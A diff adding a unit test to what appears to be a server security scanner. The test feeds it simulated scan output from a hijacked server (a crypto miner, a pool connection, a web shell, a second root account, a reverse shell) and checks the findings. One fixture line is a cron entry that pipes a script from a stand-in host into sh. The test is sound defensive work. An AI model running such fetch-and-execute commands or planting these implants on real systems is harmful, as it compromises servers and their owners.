@@ -75,6 +75,48 @@ describe("a server's security and health findings", () => {
     expect(out.find((f) => f.id === "docker-ports")?.detail).toEqual({ containers: "db" });
   });
 
+  test("a hijacked server: miner, pool, temp program, reverse shell, changed binaries, web shell, cron, second root", () => {
+    const hijacked = [
+      VPS,
+      "MINER:4242/www-data/398.0/xmrig;",
+      "HOTCPU:4242/www-data/398.0/xmrig;5150/postgres/91.0/postgres;",
+      'POOL:45.9.148.21:3333|users:(("xmrig",pid=4242,fd=12));',
+      "TMPEXE:4242=/tmp/.x/xmrig;",
+      "BACKDOOR:777~www-data~sh -i;",
+      "BINCHG:/usr/bin/ps /usr/bin/ls ",
+      "WEBSHELL:/var/www/html/up.php ",
+      "CRON:*/5 * * * * curl -s http://bad.example/x.sh | sh;",
+      "UID0:toor ",
+      "PRELOAD:",
+      "PRIVDOCKER:",
+      "ROOTKEYS:ati@laptop;igrek;",
+    ].join("\n");
+    const list = findings(hijacked);
+    const ids = list.map((f) => f.id);
+    for (const id of [
+      "miner",
+      "pool-connection",
+      "tmp-program",
+      "backdoor",
+      "changed-binaries",
+      "webshell",
+      "second-root",
+      "cron-download",
+    ])
+      expect(ids).toContain(id);
+    // The miner's process is stopped by the fix; a busy database alone is only "worth a look".
+    expect(list.find((f) => f.id === "miner")?.fix).toBe("kill -9 4242");
+    expect(list.find((f) => f.id === "backdoor")?.detail).toEqual({ processes: "sh -i (777, www-data)" });
+    expect(list.find((f) => f.id === "hot-cpu")).toMatchObject({
+      severity: "low",
+      detail: { processes: "postgres (5150, postgres, 91.0%)" },
+    });
+    expect(list.find((f) => f.id === "root-keys")?.detail).toEqual({ count: 2, keys: "ati@laptop, igrek" });
+    expect(list[0]?.severity).toBe("high");
+    // Nothing of this on a clean server.
+    expect(findings(VPS).some((f) => ["miner", "backdoor", "webshell", "hot-cpu"].includes(f.id))).toBe(false);
+  });
+
   test("a scan that never reached the server is not a clean server", () => {
     expect(scanned("ssh: connect to host 203.0.113.9 port 22: Connection timed out")).toBe(false);
     expect(scanned(VPS)).toBe(true);
